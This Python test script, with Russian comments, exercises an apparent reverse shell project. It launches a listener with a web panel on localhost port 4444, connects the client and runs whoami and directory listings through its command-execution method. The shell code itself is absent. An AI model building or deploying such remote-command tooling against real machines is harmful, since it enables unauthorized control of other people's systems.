#!/usr/bin/env python3
"""
Тестовый скрипт для проверки Reverse Shell функциональности.
"""

import time
import threading
from reverse_shell import ReverseShell, test_reverse_shell
from reverse_shell_server import start_server_with_web

def test_client_server():
    """Тестирует взаимодействие клиента и сервера."""
    print("🧪 ТЕСТИРОВАНИЕ REVERSE SHELL")
    print("=" * 50)
    
    # Запускаем сервер в отдельном потоке
    print("🚀 Запуск сервера...")
    server_thread = threading.Thread(
        target=start_server_with_web,
        args=("127.0.0.1", 4444, 8080, "test_key_2024"),
        daemon=True
    )
    server_thread.start()
    
    # Ждем запуска сервера
    time.sleep(3)
    
    print("🔗 Подключение клиента...")
    
    # Создаем клиента
    client = ReverseShell("127.0.0.1", 4444, "test_key_2024")
    
    try:
        # Запускаем клиента
        client.start()
        
        print("✅ Клиент запущен")
        print("📊 Статус клиента:")
        status = client.get_status()
        for key, value in status.items():
            if key != "system_info":
                print(f"  {key}: {value}")
        
        print("\n🔧 Тестирование команд...")
        
        # Тестируем выполнение команд
        test_commands = [
            ("echo Hello from Reverse Shell Test", False),
            ("whoami", False),
            ("dir" if client.system_info["platform"] == "Windows" else "ls", False),
        ]
        
        for command, admin in test_commands:
            print(f"\nКоманда: {command} (admin: {admin})")
            result = client._execute_command(command, admin)
            print(f"Результат: {result[:200]}..." if len(result) > 200 else f"Результат: {result}")
        
        print("\n⏳ Ожидание 10 секунд для тестирования соединения...")
        time.sleep(10)
        
        print("🛑 Остановка клиента...")
        client.stop()
        
    except KeyboardInterrupt:
        print("\n🛑 Прерывание пользователем")
        client.stop()
    except Exception as e:
        print(f"❌ Ошибка: {e}")
        client.stop()
    
    print("✅ Тестирование завершено")

def test_standalone():
    """Тестирует standalone функции."""
    print("🧪 ТЕСТИРОВАНИЕ STANDALONE ФУНКЦИЙ")
    print("=" * 50)
    
    # Тестируем базовые функции
    test_reverse_shell()
    
    print("\n✅ Standalone тестирование завершено")

if __name__ == "__main__":
    import sys
    
    if len(sys.argv) > 1 and sys.argv[1] == "standalone":
        test_standalone()
    else:
        test_client_server()
